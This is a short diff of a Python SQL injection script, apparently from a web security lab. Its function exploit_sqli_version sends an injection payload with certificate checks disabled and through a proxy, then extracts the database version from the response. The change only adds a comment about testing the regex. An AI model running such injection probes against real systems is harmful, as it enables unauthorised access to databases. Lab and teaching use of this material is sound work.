@@ -16,6 +16,7 @@ def exploit_sqli_version(url):
     r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
     res = r.text
     soup = BeautifulSoup(res, 'html.parser')
+    # use https://regex101.com/ to confirm your regex if needed.
     version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
     if version is None:
         return False
